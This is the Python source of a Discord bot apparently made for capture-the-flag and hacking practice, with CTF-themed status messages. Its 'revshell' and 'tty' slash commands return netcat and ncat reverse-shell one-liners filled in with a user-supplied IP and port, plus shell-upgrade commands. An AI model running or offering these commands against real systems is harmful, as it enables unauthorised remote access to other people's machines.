######  Copyright 2023 Daniel Tomov  #######
import discord
import os
import random
import asyncio
import datetime, time

from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv('TOKEN')

### Register intents and client ###
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

### Slash Commands ###
tree = discord.app_commands.CommandTree(client=client)
servers = [discord.Object(id=1160247666870075422), discord.Object(id=923420517560627272)]

@tree.command(name="ping", description="Gives latency between you and the bot")
async def ping(interaction):
    await interaction.response.send_message(f'Pong: {round(client.latency, 3)}ms', ephemeral=True)

@tree.command(name="revshell", description="Get a reverse shell")
async def revshell(interaction, ip_address: str, port: int):
    await interaction.response.send_message(f"""
                                            Don't forget ```bash\nnc -lnvp {port}\n```
                                            https://www.revshells.com/
                                            ```bash\nnc {ip_address} {port} -e sh```
                                            ```bash\nnc -c sh {ip_address} {port}```
                                            ```bash\nncat {ip_address} {port} -e sh```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="tty", description="Get a TTY Shell")
async def tty(interaction):
    await interaction.response.send_message(f"""
                                            ```bash\npython -c 'import pty; pty.spawn("/bin/sh")'```
                                            ```bash\necho 'os.system('/bin/bash')'```
                                            ```bash\n/bin/sh -i```
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="lolbins", description="Get websites for Living Off the Land (LOL) binaries")
async def lolbins(interaction):
    await interaction.response.send_message(f"""
                                            Windows: https://lolbas-project.github.io/
                                            Linux: https://gtfobins.github.io/
                                            """.replace("    ", ""), ephemeral=True)

@tree.command(name="github", description="DinoBot Github")
async def github(interaction):
    await interaction.response.send_message("https://github.com/Daniel-Tomov/DinoBot", ephemeral=True)

@tree.command(name="uptime", description="Uptime of Dinobot")
async def uptime(interaction):
    global startTime
    await interaction.response.send_message(str(datetime.timedelta(seconds=int(round(time.time()-startTime)))), ephemeral=True)
### Listeners ###

@client.event
async def on_ready():
    client.loop.create_task(presence())

    global startTime
    startTime = time.time()
    
    print(f'{client.user} is ready and listening')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!hello'):
        await message.channel.send('Hello!')


### Functions ###
async def presence():
    await client.wait_until_ready()

    presence_states = [
        discord.Activity(type=discord.ActivityType.watching, name='John Hammond'),
        discord.Activity(type=discord.ActivityType.watching, name='The PC Security Channel'),
        discord.Activity(type=discord.ActivityType.watching, name='NetworkChuck'),
        discord.Activity(type=discord.ActivityType.watching, name='HackerSploit'),
        discord.Activity(type=discord.ActivityType.watching, name='Infosec'),
        discord.Activity(type=discord.ActivityType.watching, name='CompuerPhile'),
        discord.Activity(type=discord.ActivityType.watching, name='Hak5'),
        discord.Activity(type=discord.ActivityType.playing, name='with a Flipper Zero'),
        discord.Activity(type=discord.ActivityType.playing, name='Vulnhub'),
        discord.Activity(type=discord.ActivityType.playing, name='picoCTF'),
        discord.Activity(type=discord.ActivityType.playing, name='Hack The Box'),
        discord.Activity(type=discord.ActivityType.playing, name='TryHackMe'),
        discord.Activity(type=discord.ActivityType.playing, name='CyberStart'),
        discord.Activity(type=discord.ActivityType.listening, name='The WAN Show'),
        discord.CustomActivity(name='Preparing for CyberForge'),
        ]
    
    while not client.is_closed():
        status = random.choice(presence_states)
        await client.change_presence( activity=status )
        await asyncio.sleep(3600)

client.run(token=TOKEN)